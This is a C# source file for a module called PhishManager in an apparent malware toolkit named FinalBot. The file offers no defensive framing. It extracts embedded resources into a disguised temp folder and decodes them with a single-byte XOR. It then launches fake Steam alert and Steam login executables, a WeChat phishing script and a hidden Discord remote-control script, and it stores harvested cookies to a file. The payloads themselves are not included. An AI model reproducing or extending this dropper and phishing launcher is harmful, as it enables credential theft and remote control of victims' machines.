using System;
using System.IO;
using System.Reflection;
using System.Diagnostics;
using System.Threading.Tasks;

namespace FinalBot.Modules
{
    public static class PhishManager
    {
        private static readonly string _tempDir = Path.Combine(Path.GetTempPath(), "FinalTempSys");

        private static void EnsureTempDir()
        {
            if (!Directory.Exists(_tempDir))
            {
                Directory.CreateDirectory(_tempDir);
            }
        }

        private static string ExtractResource(string resourceName, string outFileName)
        {
            EnsureTempDir();
            string outPath = Path.Combine(_tempDir, outFileName);

            // If it already exists, assume it's fine to reuse (or delete and recreate)
            if (File.Exists(outPath))
            {
                try { File.Delete(outPath); } catch { return outPath; }
            }

            try
            {
                var assembly = Assembly.GetExecutingAssembly();
                using (Stream stream = assembly.GetManifestResourceStream($"FinalBot.{resourceName}"))
                {
                    if (stream == null) return null;

                    if (resourceName.EndsWith(".bin"))
                    {
                        using (MemoryStream ms = new MemoryStream())
                        {
                            stream.CopyTo(ms);
                            byte[] bytes = ms.ToArray();
                            for (int i = 0; i < bytes.Length; i++) bytes[i] ^= 0xAA;
                            File.WriteAllBytes(outPath, bytes);
                        }
                    }
                    else
                    {
                        using (FileStream fileStream = new FileStream(outPath, FileMode.Create, FileAccess.Write))
                        {
                            stream.CopyTo(fileStream);
                        }
                    }
                }
                return outPath;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[PHISH] Failed to extract {resourceName}: {ex.Message}");
                return null;
            }
        }

        public static void LaunchSteamAlert()
        {
            string exePath = ExtractResource("SteamAlert.bin", "SteamAlert.exe");
            if (!string.IsNullOrEmpty(exePath))
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = exePath,
                    UseShellExecute = true
                });
            }
        }

        public static void LaunchSteamLogin()
        {
            string exePath = ExtractResource("SteamLogin.bin", "SteamLogin.exe");
            if (!string.IsNullOrEmpty(exePath))
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = exePath,
                    UseShellExecute = true
                });
            }
        }

        public static void LaunchWeChatPhish()
        {
            // Note: Since wechat_phish.py is a Python script, we attempt to run it with python
            string scriptPath = ExtractResource("core.wechat_phish.py", "wechat_phish.py");
            if (!string.IsNullOrEmpty(scriptPath))
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = "python",
                    Arguments = $"\"{scriptPath}\"",
                    UseShellExecute = true,
                    CreateNoWindow = true
                });
            }
        }

        public static void LaunchDiscordRemote()
        {
            string scriptPath = ExtractResource("websocket.discord_bot.py", "discord_bot.py");
            if (!string.IsNullOrEmpty(scriptPath))
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = "python",
                    Arguments = $"\"{scriptPath}\"",
                    UseShellExecute = true,
                    CreateNoWindow = true
                });
            }
        }

        public static void PrepareSteamFiles(string agentName, string cookies)
        {
            string tablichkaDir = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "tablichka");
            if (!Directory.Exists(tablichkaDir)) Directory.CreateDirectory(tablichkaDir);
            
            if (!string.IsNullOrEmpty(agentName))
                File.WriteAllText(Path.Combine(tablichkaDir, "agent_name.txt"), agentName);
            
            if (!string.IsNullOrEmpty(cookies))
                File.WriteAllText(Path.Combine(tablichkaDir, "cookies.txt"), cookies);
        }
    }
}
